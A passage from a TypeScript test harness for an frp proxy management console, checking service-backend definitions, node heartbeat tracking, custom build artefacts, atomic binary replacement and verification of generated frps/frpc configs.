    assert.equal(be.definitionPath('frps'), '/tmp/sup-test/frps.conf');
  });

  await test('supervisor 后端写入 program 定义并带正确路径', async () => {
    const dir = await fsp.mkdtemp('/tmp/sup-conf-');
    resetServiceBackend();
    const be = await getServiceBackend({
      force: 'supervisor',
      unitDir: dir,
      supervisorIncludeDir: dir,
      supervisorLogDir: path.join(dir, 'logs'),
      supervisorctl: 'supervisorctl',
      binPath: '/ignored/must-not-be-used',
      configPath: '/ignored.toml',
      serviceName: 'frps',
    });
    // 传入本次部署实际解析出的路径，定义文件必须采用它们
    await be.install('frps', {
      unitContent: '[Unit]\nDescription=ignored\n',
      binPath: '/usr/local/bin/frps',
      configPath: '/etc/frp/frps.toml',
    });
    const conf = await fsp.readFile(path.join(dir, 'frps.conf'), 'utf8');
    assert.match(conf, /^\[program:frps\]$/m, '应是 supervisor 段');
    assert.match(conf, /command=\/usr\/local\/bin\/frps -c \/etc\/frp\/frps\.toml/, '应使用传入的实际路径');
    assert.ok(!conf.includes('ignored'), '不得使用构造时的占位路径');
    assert.match(conf, /autostart=true/);
    assert.match(conf, /autorestart=true/);
    await fsp.rm(dir, { recursive: true, force: true });
  });

  await test('systemd 后端写入 unit 内容', async () => {
    const dir = await fsp.mkdtemp('/tmp/sysd-unit-');
    resetServiceBackend();
    const be = await getServiceBackend({
      force: 'systemd',
      unitDir: dir,
      supervisorIncludeDir: dir,
      supervisorLogDir: dir,
      supervisorctl: 'supervisorctl',
      binPath: '/usr/local/bin/frps',
      configPath: '/etc/frp/frps.toml',
      serviceName: 'frps',
    });
    await be.install('frps', {
      unitContent: '[Unit]\nDescription=test unit\n\n[Service]\nExecStart=/x/frps\n',
      binPath: '/x/frps',
      configPath: '/y.toml',
    });
    const unit = await fsp.readFile(path.join(dir, 'frps.service'), 'utf8');
    assert.match(unit, /Description=test unit/);
    assert.equal(be.definitionPath('frps'), path.join(dir, 'frps.service'));
    await fsp.rm(dir, { recursive: true, force: true });
  });

  await test('none 后端不写任何定义且状态标记为未托管', async () => {
    resetServiceBackend();
    const be = await getServiceBackend({
      force: 'none',
      unitDir: '/tmp/none',
      supervisorIncludeDir: '/tmp/none',
      supervisorLogDir: '/tmp/none',
      supervisorctl: 'supervisorctl',
      binPath: '/usr/local/bin/frps',
      configPath: '/etc/frp/frps.toml',
      serviceName: 'frps',
    });
    assert.equal(be.kind, 'none');
    await be.install('frps', { unitContent: 'x', binPath: '/a', configPath: '/b' });
    const st = await be.status('frps');
    assert.equal(st.active, false);
    assert.equal(st.state, 'unmanaged');
    // 控制操作应标记为 skipped，而不是报错
    const r = await be.restart('frps');
    assert.equal(r.skipped, true);
    assert.equal(r.ok, true);
  });

  await test('未找到定制二进制时给出可操作的构建提示', async () => {
    const emptyDir = await fsp.mkdtemp('/tmp/no-build-');
    const avail = await checkCustomAvailability(emptyDir);
    assert.equal(avail.available, false);
    assert.ok(avail.fixHint, '应提供修复提示');
    assert.match(avail.fixHint!, /build-custom-frp|定制构建/, '提示应指向构建方式');
    await fsp.rm(emptyDir, { recursive: true, force: true });
  });

  await test('可从预构建包回退识别定制二进制（容器场景）', async () => {
    // 构造一个只含 dist/ 的目录，模拟容器：没有 out/，只有 tarball
    const root = await fsp.mkdtemp('/tmp/dist-only-');
    const distDir = path.join(root, 'dist');
    await fsp.mkdir(distDir, { recursive: true });
    const realTarball = path.join(path.dirname(CUSTOM_SCRIPT), 'dist');
    let copied = false;
    try {
      const hostTarball = findHostTarball(path.dirname(CUSTOM_SCRIPT));
      if (hostTarball) {
        await fsp.copyFile(hostTarball, path.join(distDir, path.basename(hostTarball)));
        copied = true;
      }
    } catch { /* ignore */ }

    if (!copied) {
      console.log('    (无本机架构预构建包，跳过)');
      await fsp.rm(root, { recursive: true, force: true });
      return;
    }
    const avail = await checkCustomAvailability(root);
    assert.equal(avail.available, true, '仅有 dist 包时也应视为可用');
    await fsp.rm(root, { recursive: true, force: true });
  });

  console.log('\n\x1b[1m[17] 心跳接收与在线状态\x1b[0m');

  await test('有效心跳写入并反映代理状态', () => {
    const n = createNode({ name: '心跳节点', serverAddr: 'hb.example.com' });
    const res = recordHeartbeat(
      {
        token: n.installToken,
        hostname: 'hb-host',
        version: '0.71.0',
        os: 'linux',
        arch: 'amd64',
        uptime_sec: 120,
        proxies: [
          { name: 'a', type: 'tcp', status: 'running' },
          { name: 'b', type: 'tcp', status: 'start error', err: 'port not allowed' },
        ],
        load: { num_goroutine: 12, mem_alloc_mb: 9 },
      },
      '10.0.0.9',
    );
    assert.equal(res.ok, true, `心跳应被接受: ${JSON.stringify(res)}`);

    const live = getNodeLiveStatus(n.id);
    assert.equal(live.online, true, '刚上报的节点应在线');
    assert.equal(live.heartbeat?.hostname, 'hb-host');
    assert.equal(live.heartbeat?.proxyTotal, 2);
    assert.equal(live.heartbeat?.proxyRunning, 1, '只应统计 running 的代理');
    assert.equal(live.heartbeat?.memAllocMb, 9);
    assert.equal(live.heartbeat?.remoteIp, '10.0.0.9');
    deleteNode(n.id);
  });

  await test('无效 token 的心跳被拒绝且不写库', () => {
    const res = recordHeartbeat({ token: 'definitely-not-valid' }, '10.0.0.9');
    assert.equal(res.ok, false);
    assert.equal(res.status, 404);
  });

  await test('重复上报覆盖为最新状态', () => {
    const n = createNode({ name: '心跳覆盖', serverAddr: 'hb2.example.com' });
    recordHeartbeat({ token: n.installToken, hostname: 'first', proxies: [] }, '1.1.1.1');
    recordHeartbeat(
      { token: n.installToken, hostname: 'second', proxies: [{ name: 'x', type: 'tcp', status: 'running' }] },
      '2.2.2.2',
    );
    const live = getNodeLiveStatus(n.id);
    assert.equal(live.heartbeat?.hostname, 'second', '应保留最新心跳');
    assert.equal(live.heartbeat?.proxyTotal, 1);
    deleteNode(n.id);
  });

  await test('删除节点会级联删除心跳', () => {
    const n = createNode({ name: '心跳级联', serverAddr: 'hb3.example.com' });
    recordHeartbeat({ token: n.installToken, hostname: 'gone' }, '1.1.1.1');
    assert.ok(getHeartbeat(n.id), '心跳应存在');
    deleteNode(n.id);
    assert.equal(getHeartbeat(n.id), null, '节点删除后心跳应一并删除');
  });

  await test('超时未上报的节点判定为离线', () => {
    const n = createNode({ name: '心跳离线', serverAddr: 'hb4.example.com' });
    recordHeartbeat({ token: n.installToken, hostname: 'stale' }, '1.1.1.1');
    // Backdate the heartbeat beyond the online window.
    run('UPDATE node_heartbeats SET reported_at = ? WHERE node_id = ?',
        Date.now() - (HEARTBEAT_ONLINE_WINDOW_SEC + 60) * 1000, n.id);
    const live = getNodeLiveStatus(n.id);
    assert.equal(live.online, false, '超时节点应判为离线');
    assert.ok(live.heartbeat, '历史心跳仍应可读');
    deleteNode(n.id);
  });

  console.log('\n\x1b[1m[18] 定制构建脚本与产物\x1b[0m');

  await test('构建脚本存在且语法正确', async () => {
    const script = resolveCustomScript();
    assert.ok(fs.existsSync(script), `应存在构建脚本: ${script}`);
    await execFileAsync('bash', ['-n', script]);
  });

  await test('补丁清单结构完整（文件补丁 + 变换）', () => {
    const dir = path.dirname(resolveCustomScript());
    const files = fs.readdirSync(path.join(dir, 'patches', 'files')).filter((f) => f.endsWith('.go'));
    assert.ok(files.length >= 4, `应至少有 4 个文件补丁，实际 ${files.length}`);

    const spec = JSON.parse(fs.readFileSync(path.join(dir, 'patches', 'transforms.json'), 'utf8'));
    assert.ok(Array.isArray(spec.transforms) && spec.transforms.length >= 4, '应至少有 4 条源码变换');
    for (const t of spec.transforms) {
      assert.ok(t.file && t.anchor && t.replace, `变换缺少字段: ${JSON.stringify(t)}`);
      assert.ok(t.why, `变换应说明原因: ${t.file}`);
    }
  });

  await test('所有文件补丁都声明了目标路径', () => {
    const dir = path.dirname(resolveCustomScript());
    for (const f of fs.readdirSync(path.join(dir, 'patches', 'files'))) {
      if (!f.endsWith('.go')) continue;
      const head = fs.readFileSync(path.join(dir, 'patches', 'files', f), 'utf8').slice(0, 400);
      assert.match(head, /frp-console-target:\s*\S+/, `${f} 缺少 frp-console-target 声明`);
    }
  });

  await test('定制产物（若已构建）包含 diag 与心跳能力', async () => {
    const dir = path.dirname(resolveCustomScript());
    const frpc = path.join(dir, 'out', 'frpc');
    if (!fs.existsSync(frpc)) {
      console.log('    (尚未构建定制版，跳过)');
      return;
    }
    const { stdout } = await execFileAsync(frpc, ['--help']);
    assert.match(stdout, /\bdiag\b/, '定制 frpc 应包含 diag 子命令');
    const buf = fs.readFileSync(frpc, { encoding: 'latin1' });
    assert.ok(buf.includes('FRP_CONSOLE_PANEL_URL'), '定制 frpc 应包含心跳上报支持');
  });

  console.log('\n\x1b[1m[19] 用真实 frp 二进制校验生成的配置\x1b[0m');
  const testBins = await ensureTestBinaries();
  const frps = { path: testBins.frps };
  console.log(`  (二进制来源: ${testBins.source === 'custom' ? '定制版预构建包' : '上游下载'})`);

  await test('原子替换可覆盖正在被进程占用的可执行文件（ETXTBSY 修复）', async () => {
    // Simulate a busy binary: copy a real executable, run it, then swap it.
    const busyDir = await fsp.mkdtemp('/tmp/etxtbsy-');
    const busy = path.join(busyDir, 'frps');
    const replacement = path.join(busyDir, 'frps-new');
    await fsp.copyFile(frps.path, busy);
    await fsp.chmod(busy, 0o755);
    await fsp.writeFile(replacement, '#!/bin/sh\necho replaced\n', 'utf8');
    await fsp.chmod(replacement, 0o755);

    // Start the copied binary so its text segment is mapped.
    const child = spawn(busy, ['--version'], { stdio: 'ignore' });
    await new Promise((r) => setTimeout(r, 150));

    // Direct overwrite must fail, proving the scenario is real.
    let directFailed = false;
    try {
      await fsp.copyFile(replacement, busy);
    } catch (err) {
      directFailed = (err as NodeJS.ErrnoException).code === 'ETXTBSY';
    }

    // The atomic helper must succeed regardless.
    await installBinaryAtomically(replacement, busy);
    const after = await fsp.readFile(busy, 'utf8');
    assert.match(after, /replaced/, '原子替换后内容应更新');

    try { child.kill('SIGKILL'); } catch { /* ignore */ }
    await fsp.rm(busyDir, { recursive: true, force: true });
    // Record whether the environment exhibited the bug at all (informational).
    if (!directFailed) console.log('    (环境未复现 ETXTBSY，但原子替换仍生效)');
  });

  const frpc = { path: testBins.frpc };
  console.log(`  (frps: ${frps.path}${frps.downloaded ? ' [新下载]' : ''})`);

  await test('frps verify 通过生成的 frps.toml', async () => {
    const tmp = path.join('/tmp', `frps-verify-${Date.now()}.toml`);
    await fsp.writeFile(tmp, frpsToml, 'utf8');
    try {
      const { stdout, stderr } = await execFileAsync(frps.path, ['verify', '-c', tmp]);
      assert.ok(!/error/i.test(stdout + stderr), stdout + stderr);
    } finally {
      await fsp.rm(tmp, { force: true });
    }
  });

  await test('frpc verify 通过生成的 frpc.toml（含多个 proxies）', async () => {
    const tmp = path.join('/tmp', `frpc-verify-${Date.now()}.toml`);
    await fsp.writeFile(tmp, plan.frpcToml, 'utf8');
    try {
      const { stdout, stderr } = await execFileAsync(frpc.path, ['verify', '-c', tmp]);
      assert.ok(!/error/i.test(stdout + stderr), stdout + stderr);
    } finally {
      await fsp.rm(tmp, { force: true });
    }
  });

  console.log(`\n\x1b[1m结果: \x1b[32m${passed} 通过\x1b[0m, ${failed > 0 ? `\x1b[31m${failed} 失败\x1b[0m` : '0 失败'}\n`);
  process.exit(failed > 0 ? 1 : 0);
}

main().catch((err) => {
  console.error('harness 崩溃:', err);
  process.exit(1);
});
